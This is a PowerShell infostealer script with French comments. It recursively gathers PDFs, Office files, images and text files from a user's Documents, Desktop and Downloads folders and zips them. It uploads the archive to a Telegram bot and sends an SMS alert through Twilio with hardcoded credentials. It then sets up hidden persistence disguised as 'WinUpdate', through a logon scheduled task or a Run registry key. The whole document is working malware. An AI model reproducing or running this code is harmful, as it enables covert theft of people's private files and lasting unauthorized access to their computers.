# === CONFIGURATION ===
$zipName = "$env:TEMP\logs.zip"
$twilioSID = "AC2ef2bd5bd5146f76f586d2c577159f90"
$twilioAuthToken = "ab95f4ee6a016c23b123670550a6cde7"
$twilioNumber = "+12524866318"
$yourNumber = "+33635960569"

# === SCAN DE FICHIERS SENSIBLES ===
$extensions = "*.pdf","*.docx","*.doc","*.jpg","*.png","*.xlsx","*.pptx","*.txt"
$dirsToScan = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")
$collectedFiles = @()

foreach ($dir in $dirsToScan) {
    foreach ($ext in $extensions) {
        try {
            $found = Get-ChildItem -Path $dir -Recurse -Include $ext -ErrorAction SilentlyContinue
            $collectedFiles += $found
        } catch {}
    }
}

# === CREATION DU ZIP ===
Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
if (Test-Path $zipName) { Remove-Item $zipName -Force }
$zip = [System.IO.Compression.ZipFile]::Open($zipName, 'Create')

foreach ($file in $collectedFiles) {
    try {
        $entryName = ($file.FullName).Replace($env:USERPROFILE, '').TrimStart('\')
        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $file.FullName, $entryName)
    } catch {}
}
$zip.Dispose()

# === ENVOI VIA TELEGRAM ===
try {
    $tgUrl = "https://api.telegram.org/bot$telegramBotToken/sendDocument"
    $form = @{
        chat_id = $telegramChatID
        document = Get-Item $zipName
        caption = "📦 Rapport de $env:USERNAME sur $env:COMPUTERNAME"
    }
    Invoke-RestMethod -Uri $tgUrl -Method Post -Form $form
} catch {}

# === ENVOI VIA TWILIO ===
try {
    $body = "📤 ZIP exfiltré depuis $env:COMPUTERNAME ($env:USERNAME)"
    $twilioURI = "https://api.twilio.com/2010-04-01/Accounts/$twilioSID/Messages.json"
    $twilioHeaders = @{
        Authorization = ("Basic " + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$twilioSID`:$twilioAuthToken")))
    }
    $twilioBody = @{
        To = $yourNumber
        From = $twilioNumber
        Body = $body
    }
    Invoke-RestMethod -Uri $twilioURI -Method Post -Headers $twilioHeaders -Body $twilioBody
} catch {}

# === PERSISTANCE (Admin OU User) ===
function Is-Admin {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

$psScript = "$env:APPDATA\WinUpdate.ps1"
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $psScript -Force

if (Is-Admin) {
    $taskName = "WinUpdate_$(Get-Random)"
    schtasks /create /sc onlogon /tn $taskName /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$psScript`"" /rl HIGHEST /f | Out-Null
} else {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                     -Name "WinUpdate" `
                     -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$psScript`"" | Out-Null
}
